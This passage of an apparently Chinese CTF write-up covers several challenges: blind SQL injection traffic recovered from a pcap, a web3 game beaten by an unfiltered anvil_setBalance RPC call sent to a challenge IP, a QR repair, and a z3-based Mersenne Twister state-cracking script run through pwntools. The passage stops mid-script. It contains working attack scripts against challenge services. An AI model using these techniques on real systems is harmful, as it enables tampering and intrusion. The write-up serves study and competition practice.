class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> hash_val <span class="keyword">in</span> md5_hashes:</span><br><span class="line">            f.write(hash_val + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n提取完成，共找到 <span class="subst">&#123;<span class="built_in">len</span>(md5_hashes)&#125;</span> 个md5_hash值&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;结果已保存到 <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用法: python extract_md5_hash.py &lt;sql.pcapng文件路径&gt; &lt;输出txt文件路径&gt;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;示例: python extract_md5_hash.py sql.pcapng md5_hashes.txt&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    pcap_file = sys.argv[<span class="number">1</span>]</span><br><span class="line">    output_file = sys.argv[<span class="number">2</span>]</span><br><span class="line">    extract_md5_hash_from_cookie(pcap_file, output_file)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>直接搜 !&#x3D; 得到如下数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1 <span class="comment"># COUNT(table_name)</span></span><br><span class="line"><span class="built_in">users</span> <span class="comment"># table_name</span></span><br><span class="line">4 <span class="comment"># COUNT(column_name)</span></span><br><span class="line"><span class="built_in">id</span> <span class="comment"># column_name 1-2</span></span><br><span class="line">int((<span class="number">8</span>) unsigned zer # column_type <span class="number">1</span>-<span class="number">19</span></span><br><span class="line"><span class="number">00000750</span> # <span class="number">749</span> id <span class="number">1</span>-<span class="number">8</span></span><br><span class="line"><span class="number">32479</span>e9148ab99431836a40ae9136f4f # <span class="number">749</span> md5</span><br><span class="line"><span class="number">00000751</span> # <span class="number">750</span> id <span class="number">1</span>-<span class="number">8</span></span><br><span class="line"><span class="number">59</span>e58a # <span class="number">750</span> md5 <span class="number">1</span>-<span class="number">6</span></span><br></pre></td></tr></table></figure>

<p>这么点数据对不住70M 的流量包，继续检查发现应该是删除了些sqlmap的记录，需要继续写脚本判断flag的值</p>
<p>优先猜测是在md5的部分</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取数据（如果从文件读取）</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]  <span class="comment"># 去除空行和前后空格</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义排序键函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sort_key</span>(<span class="params">line</span>):</span><br><span class="line">    left_part, last_num = line.split(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    left_items = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, left_part.split(<span class="string">&quot;,&quot;</span>)))</span><br><span class="line">    <span class="keyword">return</span> (left_items[<span class="number">2</span>], <span class="built_in">int</span>(last_num))  <span class="comment"># 按第三列和最后数字排序</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按自定义键排序</span></span><br><span class="line">sorted_lines = <span class="built_in">sorted</span>(lines, key=get_sort_key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将排序结果写入data2.txt</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data2.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> sorted_lines:</span><br><span class="line">        f.write(line + <span class="string">&quot;\n&quot;</span>)  <span class="comment"># 每行末尾添加换行符，保持格式一致</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;排序完成，结果已保存到 data2.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从data2.txt读取数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 读取所有行，去除空行和前后空格</span></span><br><span class="line">    lines = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储结果的嵌套字典：&#123;第一列值: &#123;第三列值: 最小的最后数字&#125;&#125;</span></span><br><span class="line">group_data = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="comment"># 分割出左侧部分和最后数字</span></span><br><span class="line">    left_part, last_num_str = line.split(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    last_num = <span class="built_in">int</span>(last_num_str)  <span class="comment"># 转换为整数</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 分割左侧部分为列表并转换为整数</span></span><br><span class="line">    left_items = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, left_part.split(<span class="string">&quot;,&quot;</span>)))</span><br><span class="line">    first_col = left_items[<span class="number">0</span>]  <span class="comment"># 第一列的值</span></span><br><span class="line">    third_col = left_items[<span class="number">2</span>]  <span class="comment"># 第三列的值</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 初始化第一列分组</span></span><br><span class="line">    <span class="keyword">if</span> first_col <span class="keyword">not</span> <span class="keyword">in</span> group_data:</span><br><span class="line">        group_data[first_col] = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 对每个第三列，保留最小的最后数字</span></span><br><span class="line">    third_col_data = group_data[first_col]</span><br><span class="line">    <span class="keyword">if</span> third_col <span class="keyword">not</span> <span class="keyword">in</span> third_col_data:</span><br><span class="line">        third_col_data[third_col] = last_num</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> last_num &lt; third_col_data[third_col]:</span><br><span class="line">            third_col_data[third_col] = last_num</span><br><span class="line"></span><br><span class="line"><span class="comment"># 整理结果：按第一列排序，每组内按第三列排序，提取最小数字列表</span></span><br><span class="line">sorted_result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> first_col <span class="keyword">in</span> group_data:</span><br><span class="line">    <span class="comment"># 按第三列从小到大排序，提取对应的最小数字</span></span><br><span class="line">    sorted_third_cols = <span class="built_in">sorted</span>(group_data[first_col].keys())</span><br><span class="line">    min_nums = [group_data[first_col][col] <span class="keyword">for</span> col <span class="keyword">in</span> sorted_third_cols]</span><br><span class="line">    sorted_result[first_col] = min_nums</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按第一列值从小到大排序并打印结果</span></span><br><span class="line"><span class="keyword">for</span> first_col <span class="keyword">in</span> <span class="built_in">sorted</span>(sorted_result.keys()):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;first_col&#125;</span> <span class="subst">&#123;sorted_result[first_col]&#125;</span>&quot;</span>)</span><br><span class="line">flag&#123;8f3d9c1536f87f8b9b36351890&#125;</span><br></pre></td></tr></table></figure>

<h3 id="x1guessgame"><a href="#x1guessgame" class="headerlink" title="x1guessgame"></a>x1guessgame</h3><p>web3好玩爱玩</p>
<p>要10 ETH 才能得flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> button_id == <span class="string">&#x27;get flag&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> web3.eth.get_balance(player_account.address) &gt; web3.to_wei(10, <span class="string">&quot;ether&quot;</span>):</span><br><span class="line">        result = open(<span class="string">&quot;/flag&quot;</span>).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure>

<p>未过滤setBalance方法可以直接改自己账目</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">        web3.provider.make_request(</span><br><span class="line">            <span class="string">&quot;anvil_setBalance&quot;</span>,</span><br><span class="line">            [player_account.address, web3.to_wei(1, <span class="string">&quot;ether&quot;</span>)]</span><br><span class="line">        )</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">mainurl = <span class="string">&#x27;http://60.205.163.215:32609/&#x27;</span></span><br><span class="line"></span><br><span class="line">response = requests.post(</span><br><span class="line">    mainurl+<span class="string">&quot;rpc&quot;</span>,</span><br><span class="line">    json=&#123;</span><br><span class="line">    <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;anvil_setBalance&quot;</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;0x017cd877b9ce1fd17e0a52ead617f2aff98e05d3&quot;</span>,</span><br><span class="line">        hex(10**19)</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: 1</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">response = requests.post(</span><br><span class="line">    mainurl+<span class="string">&quot;button-click&quot;</span>,</span><br><span class="line">    json=&#123;</span><br><span class="line">    <span class="string">&quot;button_id&quot;</span>: <span class="string">&quot;get flag&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<h3 id="QRcode-Reconstruction"><a href="#QRcode-Reconstruction" class="headerlink" title="QRcode Reconstruction"></a>QRcode Reconstruction</h3><p><a target="_blank" rel="noopener" href="https://merri.cx/qrazybox/">QRazyBox</a></p>
<p>修修补补二维码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;WeLc0mE_t0_Nctf_2024!!!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="X1crypsc"><a href="#X1crypsc" class="headerlink" title="X1crypsc"></a>X1crypsc</h3><p>随机数预测 + 任意写 rce</p>
<p>搬一下 TFC 2025 的脚本 @张可源 </p>
<p>踩坑点：getbits(64) 时 生成两个32bits，第<strong>一</strong>个在<strong>低位</strong>第<strong>二</strong>个在<strong>高位</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/icemonster/symbolic_mersenne_cracker/blob/main/main.py</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">SYMBOLIC_COUNTER = count()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Untwister</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        name = <span class="built_in">next</span>(SYMBOLIC_COUNTER)</span><br><span class="line">        <span class="variable language_">self</span>.MT = [BitVec(<span class="string">f&#x27;MT_<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;name&#125;</span>&#x27;</span>, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>)]</span><br><span class="line">        <span class="variable language_">self</span>.index = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.solver = Solver()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#This particular method was adapted from https://www.schutzwerk.com/en/43/posts/attacking_a_random_number_generator/</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">symbolic_untamper</span>(<span class="params">self, solver, y</span>):</span><br><span class="line">        name = <span class="built_in">next</span>(SYMBOLIC_COUNTER)</span><br><span class="line"></span><br><span class="line">        y1 = BitVec(<span class="string">f&#x27;y1_<span class="subst">&#123;name&#125;</span>&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">        y2 = BitVec(<span class="string">f&#x27;y2_<span class="subst">&#123;name&#125;</span>&#x27;</span> , <span class="number">32</span>)</span><br><span class="line">        y3 = BitVec(<span class="string">f&#x27;y3_<span class="subst">&#123;name&#125;</span>&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">        y4 = BitVec(<span class="string">f&#x27;y4_<span class="subst">&#123;name&#125;</span>&#x27;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">        equations = [</span><br><span class="line">            y2 == y1 ^ (LShR(y1, <span class="number">11</span>)),</span><br><span class="line">            y3 == y2 ^ ((y2 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9D2C5680</span>),</span><br><span class="line">            y4 == y3 ^ ((y3 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xEFC60000</span>),</span><br><span class="line">            y == y4 ^ (LShR(y4, <span class="number">18</span>))</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        solver.add(equations)</span><br><span class="line">        <span class="keyword">return</span> y1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">symbolic_twist</span>(<span class="params">self, MT, n=<span class="number">624</span>, upper_mask=<span class="number">0x80000000</span>, lower_mask=<span class="number">0x7FFFFFFF</span>, a=<span class="number">0x9908B0DF</span>, m=<span class="number">397</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            This method models MT19937 function as a Z3 program</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        MT = [i <span class="keyword">for</span> i <span class="keyword">in</span> MT] <span class="comment">#Just a shallow copy of the state</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            x = (MT[i] &amp; upper_mask) + (MT[(i+<span class="number">1</span>) % n] &amp; lower_mask)</span><br><span class="line">            xA = LShR(x, <span class="number">1</span>)</span><br><span class="line">            xB = If(x &amp; <span class="number">1</span> == <span class="number">0</span>, xA, xA ^ a) <span class="comment">#Possible Z3 optimization here by declaring auxiliary symbolic variables</span></span><br><span class="line">            MT[i] = MT[(i + m) % n] ^ xB</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> MT</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_symbolic</span>(<span class="params">self, guess</span>):</span><br><span class="line">        name = <span class="built_in">next</span>(SYMBOLIC_COUNTER)</span><br><span class="line">        ERROR = <span class="string">&#x27;Must pass a string like &quot;?1100???1001000??0?100?10??10010&quot; where ? represents an unknown bit&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">type</span>(guess) == <span class="built_in">str</span>, ERROR</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">all</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x <span class="keyword">in</span> <span class="string">&#x27;01?&#x27;</span>, guess)), ERROR</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(guess) &lt;= <span class="number">32</span>, <span class="string">&quot;One 32-bit number at a time please&quot;</span></span><br><span class="line">        guess = guess.zfill(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.symbolic_guess = BitVec(<span class="string">f&#x27;symbolic_guess_<span class="subst">&#123;name&#125;</span>&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">        guess = guess[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i, bit <span class="keyword">in</span> <span class="built_in">enumerate</span>(guess):</span><br><span class="line">            <span class="keyword">if</span> bit != <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">                <span class="variable language_">self</span>.solver.add(Extract(i, i, <span class="variable language_">self</span>.symbolic_guess) == bit)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.symbolic_guess</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">self, guess</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            You need 624 numbers to completely clone the state.</span></span><br><span class="line"><span class="string">                You can input less than that though and this will give you the best guess for the state</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.index &gt;= <span class="number">624</span>:</span><br><span class="line">            name = <span class="built_in">next</span>(SYMBOLIC_COUNTER)</span><br><span class="line">            next_mt = <span class="variable language_">self</span>.symbolic_twist(<span class="variable language_">self</span>.MT)</span><br><span class="line">            <span class="variable language_">self</span>.MT = [BitVec(<span class="string">f&#x27;MT_<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;name&#125;</span>&#x27;</span>, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>)]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">                <span class="variable language_">self</span>.solver.add(<span class="variable language_">self</span>.MT[i] == next_mt[i])</span><br><span class="line">            <span class="variable language_">self</span>.index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        symbolic_guess = <span class="variable language_">self</span>.get_symbolic(guess)</span><br><span class="line">        symbolic_guess = <span class="variable language_">self</span>.symbolic_untamper(<span class="variable language_">self</span>.solver, symbolic_guess)</span><br><span class="line">        <span class="variable language_">self</span>.solver.add(<span class="variable language_">self</span>.MT[<span class="variable language_">self</span>.index] == symbolic_guess)</span><br><span class="line">        <span class="variable language_">self</span>.index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_random</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            This will give you a random.Random() instance with the cloned state.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Solving...&#x27;</span>)</span><br><span class="line">        start = time.time()</span><br><span class="line">        <span class="variable language_">self</span>.solver.check()</span><br><span class="line">        model = <span class="variable language_">self</span>.solver.model()</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Solved! (in <span class="subst">&#123;<span class="built_in">round</span>(end-start,<span class="number">3</span>)&#125;</span>s)&#x27;</span>)</span><br><span class="line">        state = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: model[x].as_long(), <span class="variable language_">self</span>.MT))</span><br><span class="line">        result_state = (<span class="number">3</span>, <span class="built_in">tuple</span>(state+[<span class="variable language_">self</span>.index]), <span class="literal">None</span>)</span><br><span class="line">        r = Random()</span><br><span class="line">        r.setstate(result_state)</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">ut = Untwister()</span><br><span class="line"></span><br><span class="line">r = process([<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;task.py&#x27;</span>])</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Monster current HP:&#x27;</span>)</span><br><span class="line">ohoho = <span class="built_in">int</span>(r.recvline().decode().strip())</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Your option:&#x27;</span>,<span class="string">b&#x27;W&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;attack value: &#x27;</span>)</span><br><span class="line">tmp1 = r.recvline().decode()</span><br><span class="line">ut.submit(<span class="built_in">bin</span>(ohoho%(<span class="number">2</span>**<span class="number">32</span>))[<span class="number">2</span>:].zfill(<span class="number">32</span>))</span><br><span class="line">ut.submit(<span class="built_in">bin</span>(ohoho&gt;&gt;<span class="number">32</span>)[<span class="number">2</span>:].zfill(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">ut.submit(<span class="built_in">bin</span>(<span class="built_in">int</span>(tmp1.split(<span class="string">&#x27;~&#x27;</span>)[<span class="number">0</span>].strip()))[<span class="number">2</span>:].zfill(<span class="number">16</span>)+<span class="string">&quot;?&quot;</span>*<span class="number">16</span>)</span><br><span class="line">ut.submit(<span class="built_in">bin</span>(<span class="built_in">int</span>(tmp1.split(<span class="string">&#x27;~&#x27;</span>)[<span class="number">1</span>].strip())-<span class="built_in">int</span>(tmp1.split(<span class="string">&#x27;~&#x27;</span>)[<span class="number">0</span>].strip()))[<span class="number">2</span>:].zfill(<span class="number">16</span>)+<span class="string">&quot;?&quot;</span>*<span class="number">16</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;weapon([y/n])?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;attack value: &#x27;</span>)</span><br><span class="line">tmp1 = r.recvline().decode()</span><br><span class="line">ut.submit(<span class="built_in">bin</span>(<span class="built_in">int</span>(tmp1.split(<span class="string">&#x27;~&#x27;</span>)[<span class="number">0</span>].strip()))[<span class="number">2</span>:].zfill(<span class="number">16</span>)+<span class="string">&quot;?&quot;</span>*<span class="number">16</span>)</span><br><span class="line">ut.submit(<span class="built_in">bin</span>(<span class="built_in">int</span>(tmp1.split(<span class="string">&#x27;~&#x27;</span>)[<span class="number">1</span>].strip())-<span class="built_in">int</span>(tmp1.split(<span class="string">&#x27;~&#x27;</span>)[<span class="number">0</span>].strip()))[<span class="number">2</span>:].zfill(<span class="number">16</span>)+<span class="string">&quot;?&quot;</span>*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your option:&#x27;</span>,<span class="string">b&#x27;W&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;weapon([y/n])?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;attack value: &#x27;</span>)</span><br><span class="line">    tmp1 = r.recvline().decode()</span><br><span class="line">    ut.submit(<span class="built_in">bin</span>(<span class="built_in">int</span>(tmp1.split(<span class="string">&#x27;~&#x27;</span>)[<span class="number">0</span>].strip()))[<span class="number">2</span>:].zfill(<span class="number">16</span>)+<span class="string">&quot;?&quot;</span>*<span class="number">16</span>)</span><br><span class="line">    ut.submit(<span class="built_in">bin</span>(<span class="built_in">int</span>(tmp1.split(<span class="string">&#x27;~&#x27;</span>)[<span class="number">1</span>].strip())-<span class="built_in">int</span>(tmp1.split(<span class="string">&#x27;~&#x27;</span>)[<span class="number">0</span>].strip()))[<span class="number">2</span>:].zfill(<span class="number">16</span>)+<span class="string">&quot;?&quot;</span>*<span class="number">16</span>)</span><br><span class="line">rnd = ut.get_random()</span><br><span class="line">tmpx,tmpy = [rnd.randrange(<span class="number">2025</span>),rnd.randrange(<span 